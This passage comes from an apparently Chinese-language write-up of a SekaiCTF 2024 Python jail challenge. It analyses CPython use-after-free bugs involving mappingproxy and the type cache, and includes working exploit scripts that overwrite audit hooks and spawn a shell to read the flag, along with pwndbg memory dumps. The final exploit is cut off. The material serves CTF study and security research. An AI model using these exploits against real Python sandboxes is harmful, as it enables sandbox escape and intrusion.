class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(A.__dict__)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;mappingproxy&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>A.__dict__<br>mappingproxy(&#123;<span class="hljs-string">&#x27;__module__&#x27;</span>: <span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;__init__&#x27;</span>: &lt;function A.__init__ at <span class="hljs-number">0x7f25181bc540</span>&gt;, <span class="hljs-string">&#x27;__dict__&#x27;</span>: &lt;attribute <span class="hljs-string">&#x27;__dict__&#x27;</span> of <span class="hljs-string">&#x27;A&#x27;</span> objects&gt;, <span class="hljs-string">&#x27;__weakref__&#x27;</span>: &lt;attribute <span class="hljs-string">&#x27;__weakref__&#x27;</span> of <span class="hljs-string">&#x27;A&#x27;</span> objects&gt;, <span class="hljs-string">&#x27;__doc__&#x27;</span>: <span class="hljs-literal">None</span>&#125;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>A.__dict__[<span class="hljs-string">&#x27;__module__&#x27;</span>]=<span class="hljs-string">&#x27;test&#x27;</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-string">&#x27;mappingproxy&#x27;</span> <span class="hljs-built_in">object</span> does <span class="hljs-keyword">not</span> support item assignment<br></code></pre></td></tr></table></figure><p>使用mappingproxy的__dict__可以禁止修改class的属性</p></li></ul></li><li><p>有一个issue可以用实例自定义的__eq__方法修改只读的mappingproxy</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># https://bugs.python.org/issue43838</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">Sneaky</span>:<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br><span class="hljs-meta">... </span>        other[<span class="hljs-string">&#x27;real&#x27;</span>] = <span class="hljs-number">42</span><br><span class="hljs-meta">... </span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">int</span>.__dict__ == Sneaky()<br><span class="hljs-meta">&gt;&gt;&gt; </span>(<span class="hljs-number">1</span>).real<br><span class="hljs-number">42</span><br></code></pre></td></tr></table></figure><p>mappingproxy的__eq__调用的就是mappingproxy_richcompare函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> PyObject *<br><span class="hljs-title function_">mappingproxy_richcompare</span><span class="hljs-params">(mappingproxyobject *v, PyObject *w, <span class="hljs-type">int</span> op)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> PyObject_RichCompare(v-&gt;mapping, w, op);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>mappingproxy_richcompare会直接使用v-&gt;mapping继续向下一层比较</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> types <span class="hljs-keyword">import</span> MappingProxyType<br><br>test_dict = &#123;<span class="hljs-string">&#x27;test1&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>, <span class="hljs-string">&#x27;test2&#x27;</span>: <span class="hljs-string">&#x27;test2&#x27;</span>&#125;<br>test_mapping = MappingProxyType(test_dict)<br>test_mapping == test_dict<br></code></pre></td></tr></table></figure><p>这里test_mapping基于test_dict创建，那v-&gt;mapping就指向test_dict</p><img src="/2024/08/31/sekai2024jailwp/w_eq_v.png" class title="w_eq_v"></li><li><p>PyObject_RichCompare是PyObject通用的__eq__函数，会继续向下一层层比较</p></li><li><p>这时候mapping指向的原始对象已经没有了mappingproxy的只读wrap</p></li><li><p>patch不进行mapping的向下比较就会导致一个死循环……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">return</span> PyObject_RichCompare(v, w, op);<br></code></pre></td></tr></table></figure><img src="/2024/08/31/sekai2024jailwp/loop.png" class title="loop"></li><li><p>但另一个issue里使用__ror__可以达到相同的效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># https://bugs.python.org/issue44596</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">SneakyOr</span>:<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__or__</span>(<span class="hljs-params">self, other</span>):<br><span class="hljs-meta">... </span>        <span class="hljs-keyword">if</span> other <span class="hljs-keyword">is</span> d:<br><span class="hljs-meta">... </span>            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;Broke encapsulation&quot;</span>)<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__ror__</span>(<span class="hljs-params">self, other</span>):<br><span class="hljs-meta">... </span>        <span class="hljs-keyword">return</span> self.__or__(other)<br><span class="hljs-meta">... </span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proxy | SneakyOr()<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">6</span>, <span class="hljs-keyword">in</span> __ror__<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">4</span>, <span class="hljs-keyword">in</span> __or__<br>RuntimeError: Broke encapsulation<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> PyObject *<br><span class="hljs-title function_">mappingproxy_or</span><span class="hljs-params">(PyObject *left, PyObject *right)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (PyObject_TypeCheck(left, &amp;PyDictProxy_Type)) &#123;<br>        left = ((mappingproxyobject*)left)-&gt;mapping;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (PyObject_TypeCheck(right, &amp;PyDictProxy_Type)) &#123;<br>        right = ((mappingproxyobject*)right)-&gt;mapping;<br>    &#125;<br>    <span class="hljs-keyword">return</span> PyNumber_Or(left, right);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h2 id="非法修改，然后呢？"><a href="#非法修改，然后呢？" class="headerlink" title="非法修改，然后呢？"></a>非法修改，然后呢？</h2><p>先过一遍部分exp的执行流程吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">wrap</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">memoryview</span>(arg).cast(<span class="hljs-string">&#x27;P&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orfn</span>(<span class="hljs-params">self, other</span>):<br>    self.a<br>    <span class="hljs-keyword">del</span> other[<span class="hljs-string">&#x27;a&#x27;</span>]<br>    <span class="hljs-keyword">return</span> wrap(self.a), [<span class="hljs-number">0</span>]*<span class="hljs-number">10</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rorfn</span>(<span class="hljs-params">self, other</span>):<br>    <span class="hljs-keyword">return</span> self.__or__(other)<br><br>t = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;&#x27;</span>, (), &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x40</span>), <span class="hljs-string">&#x27;__ror__&#x27;</span>: rorfn, <span class="hljs-string">&#x27;__or__&#x27;</span>: orfn&#125;)<br>a, b = t.__dict__ | t()<br></code></pre></td></tr></table></figure><p>大致流程</p><ul><li><p>新建了一个type t，自带一个bytearray a，还有自实现的__ror__和__or__方法</p><img src="/2024/08/31/sekai2024jailwp/bytearray_a.png" class title="bytearray_a"></li><li><p>然后进行一个t.__dict__和t()的or</p><img src="/2024/08/31/sekai2024jailwp/or1.png" class title="or1"><ul><li><p>mappingproxyobject的t.__dict__</p><img src="/2024/08/31/sekai2024jailwp/or1_proxy.png" class title="or1_proxy"><p>v-&gt;mapping指向一个PyDictObject</p><img src="/2024/08/31/sekai2024jailwp/or1_dict.png" class title="or1_dict"></li><li><p>t类型的PyObject实例</p><img src="/2024/08/31/sekai2024jailwp/or1_w.png" class title="or1_w"><p>PyTypeObject的type t</p><img src="/2024/08/31/sekai2024jailwp/or1_w_type.png" class title="or1_w_type"><p>可以发现v-&gt;mapping和w-&gt;ob_base.ob_type-&gt;tp_dict指向同一个PyDictObject</p><img src="/2024/08/31/sekai2024jailwp/or1_dict_mapping.png" class title="or1_dict_mapping"></li></ul></li><li><p>经过一次mappingproxy_or，去除了mappingproxy-&gt;mapping的wrap，进行一个dict和t()的or</p><img src="/2024/08/31/sekai2024jailwp/or2.png" class title="or2"><img src="/2024/08/31/sekai2024jailwp/or2_w_v.png" class title="or2_w_v"></li><li><p>在__or__中获取a，这时候self是type t的PyObject，other是PyDictObject</p><img src="/2024/08/31/sekai2024jailwp/get_a_1_ins.png" class title="get_a_1_ins"><img src="/2024/08/31/sekai2024jailwp/get_a_1.png" class title="get_a_1"><p>这个过程中会将a的ref+1，但由于只是取了a什么都没干，所以之后ref会减回1</p><img src="/2024/08/31/sekai2024jailwp/a_1_ref.png" class title="a_1_ref"></li><li><p>之后从other中删除a，这时候other已经是dict了</p><img src="/2024/08/31/sekai2024jailwp/del_a.png" class title="del_a"><img src="/2024/08/31/sekai2024jailwp/del_a_obj.png" class title="del_a_obj"><p>并且将a的ref-1，这时候a的ref已经是0了，所以调用bytearray_dealloc将a和a-&gt;ob_bytes都free了</p><img src="/2024/08/31/sekai2024jailwp/a_0_ref.png" class title="a_0_ref"><img src="/2024/08/31/sekai2024jailwp/dealloc_a.png" class title="dealloc_a"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">bytearray_dealloc</span><span class="hljs-params">(PyByteArrayObject *self)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (self-&gt;ob_exports &gt; <span class="hljs-number">0</span>) &#123;<br>        PyErr_SetString(PyExc_SystemError,<br>                        <span class="hljs-string">&quot;deallocated bytearray object has exported buffers&quot;</span>);<br>        PyErr_Print();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (self-&gt;ob_bytes != <span class="hljs-number">0</span>) &#123;<br>        PyObject_Free(self-&gt;ob_bytes);<br>    &#125;<br>    Py_TYPE(self)-&gt;tp_free((PyObject *)self);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>然后又通过self.a（type t的PyObject）获取到了a</p><img src="/2024/08/31/sekai2024jailwp/get_a_2.png" class title="get_a_2"><img src="/2024/08/31/sekai2024jailwp/get_a_2_obj.png" class title="get_a_2_obj"><img src="/2024/08/31/sekai2024jailwp/a_1_ref_2.png" class title="a_1_ref_2"></li></ul><p><em>…</em></p><p><em>……</em></p><p><em>？？？啊？？？</em></p><h2 id="看似没有问题实则全是问题……"><a href="#看似没有问题实则全是问题……" class="headerlink" title="看似没有问题实则全是问题……"></a>看似没有问题实则全是问题……</h2><ul><li><p>首先第二次PyObject_GenericGetAttr就不该获取到a，因为a已经从dict中删除了</p><img src="/2024/08/31/sekai2024jailwp/test_print.png" class title="test_print"><p>……看起来确实也是删掉了</p></li><li><p>delitem_common结尾a的ref确实也减到0了，也确实调用dealloc把a free了……</p><img src="/2024/08/31/sekai2024jailwp/a_0_ref.png" class title="a_0_ref"><img src="/2024/08/31/sekai2024jailwp/dealloc_a.png" class title="dealloc_a"></li><li><p>两次PyObject_GenericGetAttr的参数也是一样的</p><img src="/2024/08/31/sekai2024jailwp/get_a_1_ins.png" class title="get_a_1_ins"><img src="/2024/08/31/sekai2024jailwp/get_a_2.png" class title="get_a_2"></li><li><p>能想到的就是get a是通过type进行的，del a是通过dict进行的</p></li></ul><h2 id="PyType-Lookup"><a href="#PyType-Lookup" class="headerlink" title="_PyType_Lookup"></a>_PyType_Lookup</h2><p>那就来看看PyObject_GenericGetAttr是怎么获取a的</p><ul><li>PyObject_GenericGetAttr调用_PyObject_GenericGetAttrWithDict</li><li>_PyObject_GenericGetAttrWithDict大致流程<ul><li>调用_PyType_Lookup从type中尝试获取name</li><li>尝试从实例中获取name</li></ul></li></ul><p><em><strong>问题就出在_PyType_Lookup里！！！</strong></em></p><p>_PyType_Lookup的流程</p><ul><li>先尝试从type_cache中查找name</li><li>找不到则从type-&gt;tp_dict（就是dict）查找</li><li>将PyObject加入cache</li></ul><p><em>对了，就是这个cache……</em></p><ul><li>第一次self.a的时候会将a放进cache，且不会递增a的ref</li><li>第二次self.a的时候直接从cache中取</li></ul><p><em>终于知道第一个没用的self.a是干嘛的了，就是为了把它放进cache</em></p><ul><li>由于dealloc了a但没将a从cache中删掉导致了uaf</li><li>理论上来说type是不可写的所以cache放进去就不会再取出来了</li><li>但假定的type的不可写被打破了就出问题了</li></ul><p><strong>结论：有些过程是基于不可写的假定进行的，这个假定被打破了就出问题了</strong></p><h1 id="几种解法"><a href="#几种解法" class="headerlink" title="几种解法"></a>几种解法</h1><h2 id="利用memoryview的index的uaf"><a href="#利用memoryview的index的uaf" class="headerlink" title="利用memoryview的index的uaf"></a>利用memoryview的index的uaf</h2><p>先贴exp</p><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># implementation from https://github.com/chilaxan/pysnippets/blob/main/tricky_bugs.py#L51</span><br><span class="hljs-comment"># but modified to work with current version. Abuses how the `c` format doesn&#x27;t have a release</span><br><span class="hljs-comment"># check after running our __index__ func</span><br><br>uaf_backing = <span class="hljs-built_in">bytearray</span>(<span class="hljs-built_in">bytearray</span>.__basicsize__)<br>uaf_view = <span class="hljs-built_in">memoryview</span>(uaf_backing).cast(<span class="hljs-string">&#x27;c&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">weird_index</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__index__</span>(<span class="hljs-params">self</span>):<br>        uaf_view.release()<br>        self.memory_backing = uaf_backing.clear() <span class="hljs-keyword">or</span> <span class="hljs-built_in">bytearray</span>()<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0x17</span><br><br>uaf_view[w:=weird_index()] = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x7f</span>])<br><br>mem = w.memory_backing<br><br>RUNTIME_OFFSET = <span class="hljs-number">0x654900</span><br>A_CONST_OFFSET = <span class="hljs-number">0x65D910</span><br><br>a_addr = <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;a&#x27;</span>.__add__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><br>python_base = a_addr - A_CONST_OFFSET<br>py_runtime = python_base + RUNTIME_OFFSET<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    mem[py_runtime + <span class="hljs-number">0xBF0</span> + <span class="hljs-number">8</span> + i] = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">import</span> os<br>os.execv(<span class="hljs-string">&quot;/bin/sh&quot;</span>, [<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;cat /flag*&quot;</span>])<br><br><span class="hljs-comment"># EOF</span><br></code></pre></td></tr></table></figure><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><ul><li><p>uaf_backing地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// uaf_backing</span><br><br>pwndbg&gt; print obj<br>$<span class="hljs-number">2</span> = (PyObject *) <span class="hljs-number">0x7f94e2c6ed30</span><br>pwndbg&gt; print *(PyByteArrayObject*)obj<br>$<span class="hljs-number">3</span> = &#123;<br>  ob_base = &#123;<br>    ob_base = &#123;<br>      &#123;<br>        ob_refcnt = <span class="hljs-number">1</span>,<br>        ob_refcnt_split = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;<br>      &#125;,<br>      ob_type = <span class="hljs-number">0x5648e03408c0</span> &lt;PyByteArray_Type&gt;<br>    &#125;,<br>    ob_size = <span class="hljs-number">56</span><br>  &#125;,<br>  ob_alloc = <span class="hljs-number">57</span>,<br>  ob_bytes = <span class="hljs-number">0x7f94e2c6f230</span> <span class="hljs-string">&quot;&quot;</span>,<br>  ob_start = <span class="hljs-number">0x7f94e2c6f230</span> <span class="hljs-string">&quot;&quot;</span>,<br>  ob_exports = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>uaf_view地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// uaf_view</span><br><br>pwndbg&gt; print *(PyMemoryViewObject*)<span class="hljs-number">0x7f94e2df9600</span><br>$<span class="hljs-number">5</span> = &#123;<br>  ob_base = &#123;<br>    ob_base = &#123;<br>      &#123;<br>        ob_refcnt = <span class="hljs-number">1</span>,<br>        ob_refcnt_split = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;<br>      &#125;,<br>      ob_type = <span class="hljs-number">0x5648e03551c0</span> &lt;PyMemoryView_Type&gt;<br>    &#125;,<br>    ob_size = <span class="hljs-number">3</span><br>  &#125;,<br>  mbuf = <span class="hljs-number">0x7f94e2c7a2c0</span>,<br>  hash = <span class="hljs-number">-1</span>,<br>  flags = <span class="hljs-number">6</span>,<br>  exports = <span class="hljs-number">0</span>,<br>  view = &#123;<br>    buf = <span class="hljs-number">0x7f94e2c6f230</span>,<br>    obj = <span class="hljs-number">0x7f94e2c6ed30</span>,<br>    len = <span class="hljs-number">56</span>,<br>    itemsize = <span class="hljs-number">1</span>,<br>    readonly = <span class="hljs-number">0</span>,<br>    ndim = <span class="hljs-number">1</span>,<br>    format = <span class="hljs-number">0x5648e00d2041</span> <span class="hljs-string">&quot;B&quot;</span>,<br>    shape = <span class="hljs-number">0x7f94e2df9690</span>,<br>    strides = <span class="hljs-number">0x7f94e2df9698</span>,<br>    suboffsets = <span class="hljs-number">0x0</span>,<br>    internal = <span class="hljs-number">0x0</span><br>  &#125;,<br>  weakreflist = <span class="hljs-number">0x0</span>,<br>  ob_array = &#123;<span class="hljs-number">56</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>clear后的uaf_backing，uaf_view-&gt;view.buf已被free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// clear</span><br><br>pwndbg&gt; print *(PyByteArrayObject*)<span class="hljs-number">0x7f94e2c6ed30</span><br>$<span class="hljs-number">13</span> = &#123;<br>  ob_base = &#123;<br>    ob_base = &#123;<br>      &#123;<br>        ob_refcnt = <span class="hljs-number">2</span>,<br>        ob_refcnt_split = &#123;<span class="hljs-number">2</span>, <span class="hljs-number">0</span>&#125;<br>      &#125;,<br>      ob_type = <span class="hljs-number">0x5648e03408c0</span> &lt;PyByteArray_Type&gt;<br>    &#125;,<br>    ob_size = <span class="hljs-number">0</span><br>  &#125;,<br>  ob_alloc = <span class="hljs-number">1</span>,<br>  ob_bytes = <span class="hljs-number">0x7f94e2e24250</span> <span class="hljs-string">&quot;&quot;</span>,<br>  ob_start = <span class="hljs-number">0x7f94e2e24250</span> <span class="hljs-string">&quot;&quot;</span>,<br>  ob_exports = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>新的PyByteArrayObject，被赋值给了w.memory_backing</p><ul><li>和uaf_view-&gt;view.buf使用同一块内存</li><li>由于bytearray()没有参数所以ob_size为0且不分配ob_bytes</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// w.memory_backing</span><br><br>pwndbg&gt; print *(PyByteArrayObject*)<span class="hljs-number">0x7f94e2c6f230</span><br>$<span class="hljs-number">17</span> = &#123;<br>  ob_base = &#123;<br>    ob_base = &#123;<br>      &#123;<br>        ob_refcnt = <span class="hljs-number">1</span>,<br>        ob_refcnt_split = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;<br>      &#125;,<br>      ob_type = <span class="hljs-number">0x5648e03408c0</span> &lt;PyByteArray_Type&gt;<br>    &#125;,<br>    ob_size = <span class="hljs-number">0</span><br>  &#125;,<br>  ob_alloc = <span class="hljs-number">0</span>,<br>  ob_bytes = <span class="hljs-number">0x0</span>,<br>  ob_start = <span class="hljs-number">0x0</span>,<br>  ob_exports = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>向原先的uaf_view-&gt;view.buf[0x17]中写入0x7f，w.memory_backing的ob_size被修改为极大值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// new</span><br><br>pwndbg&gt; print *(PyByteArrayObject*)<span class="hljs-number">0x7f94e2c6f230</span><br>$<span class="hljs-number">28</span> = &#123;<br>  ob_base = &#123;<br>    ob_base = &#123;<br>      &#123;<br>        ob_refcnt = <span class="hljs-number">1</span>,<br>        ob_refcnt_split = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;<br>      &#125;,<br>      ob_type = <span class="hljs-number">0x5648e03408c0</span> &lt;PyByteArray_Type&gt;<br>    &#125;,<br>    ob_size = <span class="hljs-number">9151314442816847872</span><span class="hljs-comment">// 0x7f00000000000000</span><br>  &#125;,<br>  ob_alloc = <span class="hljs-number">0</span>,<br>  ob_bytes = <span class="hljs-number">0x0</span>,<br>  ob_start = <span class="hljs-number">0x0</span>,<br>  ob_exports = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>改_PyRuntime.audit_hooks</p><img src="/2024/08/31/sekai2024jailwp/audit_hook.png" class title="audit_hook"></li></ul><h2 id="利用mappingproxy-or的uaf"><a href="#利用mappingproxy-or的uaf" class="headerlink" title="利用mappingproxy_or的uaf"></a>利用mappingproxy_or的uaf</h2><h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># https://bugs.python.org/issue43838</span><br><span class="hljs-comment"># https://bugs.python.org/issue44596</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wrap</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">memoryview</span>(arg).cast(<span class="hljs-string">&#x27;P&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orfn</span>(<span class="hljs-params">self, other</span>):<br>    self.a<br>    <span class="hljs-keyword">del</span> other[<span class="hljs-string">&#x27;a&#x27;</span>]<br>    <span class="hljs-keyword">return</span> wrap(self.a), [<span class="hljs-number">0</span>]*<span class="hljs-number">10</span><br><br><span 